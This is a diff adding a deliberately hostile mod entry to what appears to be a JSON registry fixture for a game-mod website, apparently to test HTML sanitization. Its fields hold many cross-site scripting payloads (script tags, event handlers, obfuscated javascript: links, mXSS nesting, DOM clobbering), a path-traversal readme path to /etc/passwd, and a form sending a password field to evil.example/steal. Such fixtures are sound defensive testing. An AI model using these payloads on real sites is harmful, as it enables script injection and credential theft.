@@ -329,6 +329,164 @@
      }
     }
    ]
+  },
+  {
+   "id": "evil-fields",
+   "trust": "unchecked",
+   "name": "Evil \"fields\" </title><script>window.__pwned=11</script>",
+   "author": "<b onmouseover=\"window.__pwned=12\">author</b>",
+   "description": "</script><script>window.__pwned=13</script><img src=x onerror=\"window.__pwned=10\">",
+   "license": "MIT<script>window.__pwned=14</script>",
+   "homepage": "javascript:window.__pwned=15",
+   "repo": "https://github.com/OpenRAC/openrac-mods",
+   "path": "camera-base",
+   "type": "script",
+   "games": {
+    "rac1": [
+     "pal",
+     "ntsc"
+    ]
+   },
+   "tags": [
+    "<script>window.__pwned=18</script>"
+   ],
+   "impact": [
+    "cosmetic"
+   ],
+   "aliases": [],
+   "links": {
+    "bugs": "javascript:window.__pwned=16",
+    "docs": "//evil.example/docs",
+    "discord": "https://discord.gg/x\" onclick=\"window.__pwned=17"
+   },
+   "downloads": 900,
+   "downloads7d": 40,
+   "created": "2026-08-01T12:00:00Z",
+   "updated": "2026-09-10T12:00:00Z",
+   "featured": false,
+   "recommends": [],
+   "suggests": [],
+   "readme": "# Fields\n\n<svg><script>window.__pwned=20</script></svg>\n\n<svg onload=\"window.__pwned=21\"></svg>\n\n<math><mtext><table><mglyph><style><img src=x onerror=\"window.__pwned=22\">\n\n<a href=\"jav&#x09;ascript:window.__pwned=23\">tab link</a>\n\n<a href=\" javascript:window.__pwned=24\">space link</a>\n\n[vb](vbscript:msgbox(1)) [data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) [ent](javascript&#58;window.__pwned=25)\n\n<form action=\"https://evil.example/steal\"><input name=\"pw\" autofocus onfocus=\"window.__pwned=26\"><button formaction=\"javascript:window.__pwned=27\">go</button></form>\n\n<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">\n\n<base href=\"https://evil.example/\">\n\n<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">\n\n<style>body{display:none}</style>\n\n<object data=\"https://evil.example/x.swf\"></object><embed src=\"https://evil.example/x\">\n\n<video poster=\"https://evil.example/p.png\" src=\"https://evil.example/v.mp4\"></video><audio src=\"https://evil.example/a.mp3\"></audio>\n\n<img srcset=\"https://evil.example/s.png 1x\" src=\"https://evil.example/s2.png\" alt=\"srcset\">\n\n<details open ontoggle=\"window.__pwned=28\"><summary>s</summary>x</details>\n\n<a href=\"https://evil.example/ping\" ping=\"https://evil.example/p\" target=\"_blank\">target link</a>\n\n<div id=\"details\" class=\"fixed inset-0 z-50\">clobber</div>\n\n<a id=\"__next\" name=\"mods\">clobber2</a>\n\n<input type=\"checkbox\" checked onclick=\"window.__pwned=29\">\n\n<textarea><img src=x onerror=\"window.__pwned=30\"></textarea>\n\n<noscript><p title=\"</noscript><img src=x onerror=window.__pwned=31>\"></noscript>\n\n<iframe srcdoc=\"<script>parent.__pwned=32</script>\"></iframe>\n\n<a href=\"https://example.com\" style=\"position:fixed;inset:0\">overlay</a>\n\n![x](javascript:window.__pwned=33) ![y](//evil.example/y.png)\n\n<IMG SRC=\"jav&#x0A;ascript:alert(1)\">\n\n<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;window.__pwned=34\">entities</a>",
+   "readmeFile": "../../../etc/passwd.md",
+   "media": {
+    "icon": {
+     "hash": "c6bf3d641933",
+     "widths": [
+      256
+     ],
+     "width": 256,
+     "height": 256,
+     "thumbhash": "3OcRJYB4d3h/iIeHeEh3eIhw+j3A",
+     "alt": "Camera base icon"
+    },
+    "banner": {
+     "hash": "a26a765ffc4f",
+     "widths": [
+      480,
+      960,
+      1600
+     ],
+     "width": 1600,
+     "height": 686,
+     "thumbhash": "3OcRJYB4d3h/iIeHeEh3eIhw+j3A",
+     "alt": "Camera base banner"
+    },
+    "screenshots": [
+     {
+      "hash": "327741f6d320",
+      "widths": [
+       480,
+       960,
+       1600
+      ],
+      "width": 1600,
+      "height": 900,
+      "thumbhash": "3OcRJYB4d3h/iIeHeEh3eIhw+j3A",
+      "alt": "Camera base screenshot 1",
+      "caption": "Camera base in action 1"
+     },
+     {
+      "hash": "bef8bb0e6777",
+      "widths": [
+       480,
+       960,
+       1600
+      ],
+      "width": 1600,
+      "height": 900,
+      "thumbhash": "3OcRJYB4d3h/iIeHeEh3eIhw+j3A",
+      "alt": "Camera base screenshot 2",
+      "caption": "Camera base in action 2"
+     }
+    ],
+    "videos": [
+     {
+      "youtube": "x\"><script>window.__pwned=40</script>",
+      "title": "t",
+      "caption": "<img src=x onerror=\"window.__pwned=10\">"
+     }
+    ]
+   },
+   "versions": [
+    {
+     "version": "1.2.0",
+     "api": "9.0",
+     "games": {
+      "rac1": [
+       "pal",
+       "ntsc"
+      ]
+     },
+     "requires": [],
+     "conflicts": [],
+     "hooks": [],
+     "tag": "evil-fields-1.2.0",
+     "released": "2026-09-10T12:00:00Z",
+     "prerelease": false,
+     "changelog": "<script>window.__pwned=41</script><img src=x onerror=\"window.__pwned=10\">\n\n[c](javascript:window.__pwned=42)",
+     "size": 12000,
+     "files": [
+      "<img src=x onerror=\"window.__pwned=43\">.lua",
+      "a/../../b.luau"
+     ],
+     "platforms": {
+      "any": {
+       "asset": "camera-base-1.2.0.zip",
+       "sha256": "207e82b780454f99a1397cd37d0b47f7a7cf19a0aee287e987eac2397373a389",
+       "size": 12000
+      }
+     }
+    },
+    {
+     "version": "1.1.0",
+     "api": "9.0",
+     "games": {
+      "rac1": [
+       "pal",
+       "ntsc"
+      ]
+     },
+     "requires": [],
+     "conflicts": [],
+     "hooks": [],
+     "tag": "evil-fields-1.1.0",
+     "released": "2026-08-01T12:00:00Z",
+     "prerelease": false,
+     "changelog": "<script>window.__pwned=41</script><img src=x onerror=\"window.__pwned=10\">\n\n[c](javascript:window.__pwned=42)",
+     "size": 12000,
+     "files": [
+      "<img src=x onerror=\"window.__pwned=43\">.lua",
+      "a/../../b.luau"
+     ],
+     "platforms": {
+      "any": {
+       "asset": "camera-base-1.1.0.zip",
+       "sha256": "e936b842d562cd65b68d85c9b150e5e7de0de60ce9553347957e459cabbb2bbe",
+       "size": 12000
+      }
+     }
+    }
+   ]
   }
  ],
  "revoked": [
